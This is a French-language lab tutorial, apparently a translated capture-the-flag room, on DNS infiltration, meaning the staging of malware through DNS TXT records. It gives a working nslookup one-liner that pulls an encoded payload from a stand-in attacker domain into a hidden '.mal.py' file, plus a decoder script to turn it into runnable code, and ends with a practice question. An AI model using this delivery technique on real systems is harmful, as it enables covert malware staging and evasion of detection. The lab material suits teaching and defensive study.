# Infiltration DNS 

### Infiltration DNS : Theorie

- L'infiltration DNS est une autre méthode utilisée par les attaquants pour exploiter les diverses vulnérabilités du système de noms de domaine d'une organisation. 

- Contrairement aux attaques d'exfiltration sur le DNS, l'infiltration définit le processus par lequel le code malveillant est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés où les attaquants se connectent à distance à l'infrastructure réseau, soit manuellement.

- L'infiltration DNS est principalement utilisée pour la delivery de fichiers/programmes ou de staging de logiciels malveillants. 

- Avec des systèmes de détection des menaces basés sur le comportement, les signatures ou la réputation, il est possible que cette méthode d'attaque soit détectée.

- Cependant, si cette méthode de transport des données passe inaperçue, elle peut conduire à des activités malveillantes telles que l'exécution de code dans l'environnement de l'organisation. 

- Historiquement, cela a causé des ravages et des perturbations pour diverses entreprises bien connues.

- En résumé, le protocole DNS pourrait être utilisé comme un protocole secret qui pourrait faciliter les efforts de mise en scène et d'exécution des logiciels malveillants pour communiquer avec le ou les serveurs C2 (commande et contrôle) d'un attaquant. 

- Dans la tâche suivante, nous explorerons comment cela pourrait être réalisé.

---

### Infiltration DNS : Exemple

- Dans ce scénario, l'attaquant va infiltrer un morceau de code « malveillant » sur l'ordinateur de la victime. 
- Il existe de nombreuses techniques différentes que les attaquants dans le monde réel utilisent pour y parvenir. 
- Pour simplifier les choses, j'utiliserai un enregistrement TXT configuré sur un serveur DNS AWS public. La valeur contenue dans cet enregistrement est un code 'malveillant' encodé.

- Étant donné que les enregistrements TXT sont limités à 255 caractères, les pirates informatiques auront probablement plusieurs enregistrements TXT configurés pour leur serveur DNS. Cela dépend finalement de la longueur de leur code. 
- Maintenant que tout est configuré et prêt, tout ce que le hacker doit faire est de demander ces enregistrements TXT, de capturer la ou les valeurs, de les décoder et, les voilà maintenant infiltré leur propre code dans un système compromis via les enregistrements DNS TXT.

(Cliquez pour agrandir au besoin)

<img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>

Vous pouvez voir mon enregistrement TXT ci-dessous.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807138166867623956/1.PNG"/>


Fichiers utilisés pour cette démo

1. `nslookup`

Cela recherchera d'abord l'enregistrement TXT pour rt1.badbaddoma.in, puis obtiendra la valeur entre guillemets, et enfin, il enregistrera la valeur dans un fichier nommé '.mal.py'.

`nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py
`

2. [packetSimple.py`](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetySimple.py)

Lorsque le code vous demande un 'Nom de fichier', entrez le nom de fichier '.mal.py'. C'est le fichier dans lequel nous avons enregistré la valeur encodée.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807140371967508500/2.PNG"/>


`python3 ~/packetySimple.py. 
`
`Filename: .mal.py  
`
`[+] Reading from file...  
`
`[+] Base58 decoded.  
`
`[+] Base64 decoded.  
`
`[+] Done, .mal.py is decoded.  
`

---

### Infiltration DNS : Pratique

- Lisez le fichier TASK qui se trouve dans le dossier `~/challenges/infiltration/`.

- Vous pouvez utiliser la même commande que celle utilisée dans la partie Infiltration DNS - Exemple.
- Gardez à l'esprit que vous devrez ajuster la section « grep » et utiliser les caractères appropriés pour faire correspondre. Par exemple, si la valeur de texte de l'enregistrement TXT commence par « G6... », vous devrez utiliser « grep G6 ».

**Répondre aux questions ci-dessous**

Suivez les instructions du fichier TASK pour répondre à cette question.

Quelle est la sortie du fichier python exécuté
```
reponse
```
